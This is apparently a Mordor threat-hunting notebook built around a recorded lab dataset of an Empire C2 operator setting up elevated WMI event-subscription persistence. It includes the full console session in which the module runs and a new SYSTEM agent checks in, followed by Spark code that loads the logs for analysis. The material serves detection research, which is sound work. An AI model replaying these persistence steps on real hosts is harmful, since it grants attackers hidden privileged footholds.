{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Elevated WMI Eventing"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/05/18 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | ['[TA0003](https://attack.mitre.org/tactics/TA0003)', '[TA0004](https://attack.mitre.org/tactics/TA0004)'] |\n",
    "| Techniques        | ['[T1546.003](https://attack.mitre.org/techniques/T1546/003)'] |\n",
    "| Tags              | ['Local WMI Eventing', 'WMI Event Subscriptions'] |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries leveraging WMI subscriptions locally for persistence."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/host/empire_wmi_local_event_subscriptions_elevated_user.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/host/empire_wmi_local_event_subscriptions_elevated_user.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Mordor shire | C2 | [wmi](https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: powershell/privesc/bypassuac_fodhelper) > agents\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "28BNF7RH ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5392   5/0.0    2020-09-04 20:31:17  http            \n",
    "W2TBCPHU ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5584   5/0.0    2020-09-04 20:42:01  http            \n",
    "13ZK6G7M ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5676   5/0.0    2020-09-04 20:41:59  http            \n",
    "\n",
    "(Empire: agents) > interact 13ZK6G7M\n",
    "(Empire: 13ZK6G7M) > \n",
    "(Empire: 13ZK6G7M) > usemodule persistence/elevated/wmi*\n",
    "(Empire: powershell/persistence/elevated/wmi) > info\n",
    "\n",
    "              Name: Invoke-WMI\n",
    "            Module: powershell/persistence/elevated/wmi\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @mattifestation\n",
    "  @harmj0y\n",
    "  @jbooz1\n",
    "\n",
    "Description:\n",
    "  Persist a stager (or script) using a permanent WMI\n",
    "  subscription. This has a difficult detection/removal rating.\n",
    "\n",
    "Comments:\n",
    "  https://github.com/mattifestation/PowerSploit/blob/master/Pe\n",
    "  rsistence/Persistence.psm1\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name        Required    Value                     Description\n",
    "  ----        --------    -------                   -----------\n",
    "  Agent       True        13ZK6G7M                  Agent to run module on.                 \n",
    "  Listener    True        http                      Listener to use.                        \n",
    "  DailyTime   False                                 Daily time to trigger the script        \n",
    "                                                    (HH:mm).                                \n",
    "  AtStartup   False       True                      Switch. Trigger script (within 5        \n",
    "                                                    minutes) of system startup.             \n",
    "  FailedLogon False                                 Trigger script with a failed logon      \n",
    "                                                    attempt from a specified user           \n",
    "  SubName     True        Updater                   Name to use for the event subscription. \n",
    "  ExtFile     False                                 Use an external file for the payload    \n",
    "                                                    instead of a stager.                    \n",
    "  Cleanup     False                                 Switch. Cleanup the trigger and any     \n",
    "                                                    script from specified location.         \n",
    "  UserAgent   False       default                   User-agent string to use for the staging\n",
    "                                                    request (default, none, or other).      \n",
    "  Proxy       False       default                   Proxy to use for request (default, none,\n",
    "                                                    or other).                              \n",
    "  ProxyCreds  False       default                   Proxy credentials                       \n",
    "                                                    ([domain\\]username:password) to use for \n",
    "                                                    request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/persistence/elevated/wmi) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked 13ZK6G7M to run TASK_CMD_WAIT\n",
    "[*] Agent 13ZK6G7M tasked with task ID 1\n",
    "[*] Tasked agent 13ZK6G7M to run module powershell/persistence/elevated/wmi\n",
    "(Empire: powershell/persistence/elevated/wmi) > \n",
    "WMI persistence established using listener http with OnStartup WMI subsubscription trigger.\n",
    "\n",
    "(Empire: powershell/persistence/elevated/wmi) > \n",
    "(Empire: powershell/persistence/elevated/wmi) > \n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "[*] New agent PYA28EDF checked in\n",
    "[+] Initial agent PYA28EDF from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to PYA28EDF at 172.18.39.5\n",
    "\n",
    "(Empire: powershell/persistence/elevated/wmi) > \n",
    "(Empire: powershell/persistence/elevated/wmi) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "28BNF7RH ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5392   5/0.0    2020-09-04 20:31:17  http            \n",
    "W2TBCPHU ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5584   5/0.0    2020-09-04 20:43:48  http            \n",
    "13ZK6G7M ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5676   5/0.0    2020-09-04 20:43:48  http            \n",
    "\n",
    "PYA28EDF ps 172.18.39.5     WORKSTATION5      *THESHIRE\\SYSTEM        powershell         7480   5/0.0    2020-09-04 20:49:29  http            \n",
    "\n",
    "(Empire: agents) > interact PYA28EDF\n",
    "(Empire: PYA28EDF) > shell whoami\n",
    "[*] Tasked PYA28EDF to run TASK_SHELL\n",
    "[*] Agent PYA28EDF tasked with task ID 1\n",
    "(Empire: PYA28EDF) > \n",
    "nt authority\\system\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: PYA28EDF) > \n",
    "(Empire: PYA28EDF) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/host/empire_wmi_local_event_subscriptions_elevated_user.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
